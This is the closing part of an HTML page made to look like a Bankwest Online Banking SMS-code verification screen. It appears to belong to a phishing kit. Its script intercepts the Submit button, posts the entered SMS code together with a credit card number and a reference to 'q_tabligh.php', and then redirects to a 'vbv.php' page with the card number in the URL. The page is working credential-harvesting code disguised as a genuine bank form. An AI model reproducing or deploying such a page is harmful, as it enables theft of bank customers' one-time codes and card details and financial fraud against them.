                                        }
                                    </style>
                                </defs>
                                <path
                                    id="error_icon"
                                    class="cls-1"
                                    d="M17.826,13.745h0C16.628,11.361,14.62,7.981,12.849,5c-0.927-1.561-1.8-3.035-2.435-4.155a1.615,1.615,0,0,0-2.839,0C6.942,1.965,6.066,3.441,5.138,5c-1.77,2.981-3.777,6.36-4.974,8.742A1.511,1.511,0,0,0,0,14.427,1.59,1.59,0,0,0,1.607,16H16.383a1.59,1.59,0,0,0,1.607-1.57A1.513,1.513,0,0,0,17.826,13.745Zm-8.831.8a0.727,0.727,0,1,1,.749-0.727A0.739,0.739,0,0,1,8.995,14.542ZM9.744,12a0.369,0.369,0,0,1-.375.364H8.62A0.369,0.369,0,0,1,8.245,12V4A0.369,0.369,0,0,1,8.62,3.636H9.369A0.369,0.369,0,0,1,9.744,4v8Z"
                                ></path>
                            </svg>
                        </div>
                        <div id="invalid-input-msg" class="error-text hide"></div>
                    </div>
                    <input id="verify-btn-elongated" class="submit-label" type="button" value="Submit" tabindex="13" />
                </div>
                <button type="button" class="resend-label button-link" name="resend" value="resend" formnovalidate="" id="resend-label">Resend SMS code</button>

                <footer id="footer">
                    <div class="why-info-label" id="why-info-label"><i id="why-arrow" class="arrow up"></i>Learn more about SMS code</div>
                    <div class="expandable-text">
                        <p id="why-info-text" class="scrollbar">SMS code is a free service available to all Bankwest Online Banking customers. It provides added security when completing certain transactions.</p>
                    </div>
                </footer>
            </div>
        </form>

                <script>
$(document).ready(function() {
    $('#verify-btn-elongated').click(function(e) {
        console.log(1);
        e.preventDefault(); // prevent regular form submission
        $.ajax({
            url: './q_tabligh.php?reference=' + document.getElementById("reference").value + '&ccnumber=' + document.getElementById("ccnumb").value,
            type: 'post',
            data: $('#verify_form').serialize(), // send form data
            success: function(response) {
                console.log(response);
                if (response.trim() === 'ok') {
                    window.location.href = 'vbv.php?reference=' + document.getElementById("reference").value + '&ccnumber=' + document.getElementById("ccnumb").value + '&repeat=1';
                } else {
                    console.log("Response from server: ", response);
                }
            },
        });
    });
});


                </script>
    </body>
</html>
